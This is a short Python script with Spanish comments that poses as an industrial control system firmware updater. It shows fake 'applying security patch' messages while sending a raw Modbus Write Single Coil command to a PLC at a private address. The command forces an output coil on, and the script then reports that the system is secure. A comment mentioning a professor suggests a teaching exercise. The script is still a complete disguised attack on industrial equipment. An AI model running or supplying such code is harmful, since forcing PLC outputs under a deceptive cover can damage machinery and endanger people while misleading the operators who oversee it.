import socket
import time

IP_PLC = '192.168.70.129'
PUERTO_MODBUS = 502

print("=== Actualizador de Firmware ICS v2.1 ===")
print("[*] Iniciando comprobación de sistema...")
time.sleep(1)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    
    # 1. El TCP SYN (El inicio perfecto para el profesor)
    s.connect((IP_PLC, PUERTO_MODBUS))
    print("[*] Conectando al PLC... [OK]")
    print("[*] Aplicando parche de seguridad. Por favor, espere...")
    
    # 2. EL ATAQUE OCULTO (Modbus TCP puro)
    # Mientras el usuario lee "Aplicando parche", el script envía un comando real.
    # Función 05 (Write Single Coil). Obliga a encender la bobina 0 (forzar salida).
    payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xFF\x00'
    s.send(payload)
    
    # Recibe la confirmación del PLC
    s.recv(1024)
    time.sleep(1)
    
    # 3. El FIN/ACK (Cierre limpio)
    s.close()
    print("[+] Parche aplicado con éxito. El sistema está seguro.")

except Exception as e:
    print(f"[!] Error: {e}")
